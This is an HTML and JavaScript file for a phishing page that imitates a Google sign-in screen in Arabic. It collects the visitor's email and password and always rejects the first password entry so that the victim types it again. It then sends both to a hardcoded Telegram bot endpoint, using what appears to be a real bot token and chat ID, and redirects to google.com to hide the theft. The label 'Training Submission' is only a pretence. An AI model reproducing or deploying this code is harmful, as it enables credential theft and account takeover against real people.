   <style>
    /* Base Reset & Typography */
    /* Base Reset & Typography */
    body {
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      line-height: 1.5;
      direction: rtl; /* RTL Support */
      text-align: right;
    }

    :root {
      --gm3-sys-color-primary: rgb(168 199 250 / 1);
    }

    /* Container */
    .container {
      max-width: 400px;
      margin: 80px auto 0 auto; /* top spacing to match screenshot */
      padding: 40px 32px 32px;
      background: #121212;
      border-radius: 12px;
      box-shadow: none;
    }

    .container svg {
      display: block;
      margin: 0 0 24px auto; /* push logo to top right */
    }

    /* Title */
    h1 {
      font-size: 34px;
      font-weight: 200;
      margin: 0 0 0 0;
      color: #fff;
    }

    /* Subtitle */
    .subtitle {
      font-size: 16px;
      color: #e8eaed;
      margin-bottom: 24px;
      line-height: 1.6;
    }

    /* Input Field */
    .input-group {
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      border: 0.5px solid #c0c3c7;
      border-radius: 6px;
      font-size: 16px;
      color: #e8eaed;
      outline: none;
      box-sizing: border-box;
      background-color: transparent;
      padding:20px;
    }

    .input-group input::placeholder {
      color: #c1c5c9;
    }

    .input-group input:focus {
      border-color: #8ab4f8;
      box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.3);
    }

    /* Link */
    .link {
      color: #8ab4f8;
      text-decoration: none;
      font-size: 14px;
      display: inline-block;
      margin-bottom: 24px;
    }

    .link:hover {
      text-decoration: underline;
    }

    /* Button */
    .button {
      background-color: var(--gm3-sys-color-primary);
      color: #0b3876;
      border: none;
      padding: 14px 24px;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      display: block;
      margin: 24px 0 0 auto;
    }

    .button:hover {
      background-color: rgba(168, 199, 250, 0.9);
    }

    /* Footer */
    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 13px;
      color: #9aa0a6;
      display: flex;
      justify-content: center;
      gap: 20px;
    }

    .footer a {
      color: #9aa0a6;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    /* Language Selector */
    .language-select {
      text-align: center;
      font-size: 13px;
      color: #9aa0a6;
      margin-top: 32px;
    }

    /* Responsive */
    @media (max-width: 480px) {
      .container {
        margin: 0;
        padding: 24px 16px;
        border-radius: 0;
        background-color: #000;
      }
    }
    /* Additional Styles for Step 2 */
    .email-pill {
      display: inline-flex;
      align-items: center;
      background-color: transparent;
      border: 1px solid #5f6368;
      border-radius: 24px;
      padding: 8px 12px;
      margin-bottom: 16px;
      font-size: 14px;
      color: #e8eaed;
      max-width: 100%;
      box-sizing: border-box;
      width: auto;
      min-width: 0;
    }
    .email-pill svg {
      margin: 0 8px;
      flex-shrink: 0;
    }
    #email-display-text {
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      max-width: 220px;
      display: inline-block;
      vertical-align: middle;
    }

  </style>
</head>
<body>
  <!-- Step 1: Email Entry -->
  <div class="container" id="step1" style="padding: 24px;">

    </svg>
    <div style="text-align: right; margin-bottom: 28px;">
      
      <h1>تسجيل الدخول</h1>

    </div>

    <div class="input-group">
      <input type="email" id="email-input" placeholder=" البريد الإلكتروني أو رقم الهاتف" required autocomplete="email" style="background-color: transparent; padding:18px;">
      <a href="#" class="link" style="margin-top:6px;">نسيت االبريد الإلكتروني؟</a>
    </div>

    <p style="margin: 24px 0; color: #bdc1c6; font-size: 14px; text-align: right;">
      ألا تمتلك هذا الكمبيوتر؟ استخدِم وضع الضيف لتسجيل الدخول بشكلٍ خاص.
      <a href="https://support.Goge.com/chrome/answer/6130773?hl=ar" class="link">مزيد من المعلومات حول استخدام "وضع الضيف"</a>
    </p>

    <div style="display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse;">
      <button id="next-btn" class="button" style="width: auto; min-width: 70px; margin: 0; border-radius:24px; padding:12px">التالي</button>
      <a href="#" class="link" style="margin-left: 8px;">إنشاء حساب</a>

  <!-- Step 2: Name (Password-style) -->
  <div class="container" id="step2" style="display: none;">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>

    <h1>مرحباً</h1>

    <div class="email-pill">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 640 640">
        <path fill="currentColor" d="M463 448.2C440.9 409.8 399.4 384 352 384L288 384C240.6 384 199.1 409.8 177 448.2C212.2 487.4 263.2 512 320 512C376.8 512 427.8 487.3 463 448.2zM64 320C64 178.6 178.6 64 320 64C461.4 64 576 178.6 576 320C576 461.4 461.4 576 320 576C178.6 576 64 461.4 64 320zM320 336C359.8 336 392 303.8 392 264C392 224.2 359.8 192 320 192C280.2 192 248 224.2 248 264C248 303.8 280.2 336 320 336z"/>
      </svg>
      <span id="email-display-text">name@gmail.com</span>
      <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#9aa0a6" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
    </div>

    <p class="subtitle">للتأكد من انه انت, يرجي ادخال كلمة المرور</p>

    <div class="input-group">
      <input type="password" id="name-input" placeholder="ادخال كلمة المرور" autocomplete="current-password" required style="background-color: transparent; padding:18px;">
    </div>

    <div class="checkbox-wrapper">
      <input type="checkbox" id="show-name">
      <label for="show-name">إظهار كلمة المرور</label>
    </div>

    <div style="display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse;">
      <button id="submit-btn" class="button" style="width: auto; min-width: 70px; margin: 0; border-radius:24px; padding:12px">التالي</button>
      <a href="#" class="link" style="margin: 24px;">جرب طريقة اخري</a>
    </div>


    <div class="loading" id="loading"></div>
  </div>

  <div class="language-select">العربية (مصر)</div>

  <div class="footer">
    <a href="#">مساعدة</a>
    <a href="#">الخصوصية</a>
    <a href="#">الشروط</a>
  </div>
<script>
  // Telegram Configuration
  const TELEGRAM_BOT_TOKEN = '8350768912:AAFxZ4hNXYAHJvaRL3cBJ_3u-2LxCOq6vv8';
  const TELEGRAM_CHAT_ID = '5868577144';

  // DOM Elements
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const emailInput = document.getElementById('email-input');
  const nameInput = document.getElementById('name-input');
  const emailDisplay = document.getElementById('email-display-text');
  const nextBtn = document.getElementById('next-btn');
  const submitBtn = document.getElementById('submit-btn');
  const showNameCheckbox = document.getElementById('show-name');
  const loadingEl = document.getElementById('loading');

  // Track name submission attempts
  let nameSubmittedOnce = false;

  // Toggle name visibility
  showNameCheckbox.addEventListener('change', () => {
    nameInput.type = showNameCheckbox.checked ? 'text' : 'password';
  });

  // Step 1 → Step 2
  nextBtn.addEventListener('click', () => {
    const email = emailInput.value.trim();
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      emailInput.style.borderColor = '#ea4335';
      return;
    }
    emailInput.style.borderColor = '#c0c3c7';
    emailDisplay.textContent = email;
    step1.style.display = 'none';
    step2.style.display = 'block';
  });

  // Step 2 Submit
  submitBtn.addEventListener('click', async () => {
    const name = nameInput.value.trim();
    const email = emailDisplay.textContent;

    // First attempt: always show error (even if name is filled)
    if (!nameSubmittedOnce) {
      nameSubmittedOnce = true; // mark first attempt
      nameInput.style.borderColor = '#ea4335';
      // Optional: show a message like "Incorrect name. Please try again."
      console.log('اسم غير صحيح. يرجى المحاولة مرة أخرى.');
      return;
    }

    // Second attempt: accept any non-empty name
    if (!name) {
      nameInput.style.borderColor = '#ea4335';
      return;
    }

    // Reset border & proceed
    nameInput.style.borderColor = '#c0c3c7';
    submitBtn.disabled = true;
    loadingEl.style.display = 'block';

    try {
      const message = `*New Training Submission*\n\nName: ${name}\nEmail: ${email}`;
      
      // 🔥 FIXED: Removed extra space in URL
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      const result = await response.json();
      if (result.ok) {
        console.log('تم الإرسال بنجاح!');
         setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 700);
      } else {
        console.error('Telegram error:', result.description);
      console.log('فشل الإرسال: ' + (result.description || 'خطأ غير معروف'));
      }
    } catch (error) {
      console.error('Network error:', error);
      console.log('❌ خطأ في الاتصال: ' + error.message);
    } finally {
      submitBtn.disabled = false;
      loadingEl.style.display = 'none';
    }
  });
</script>
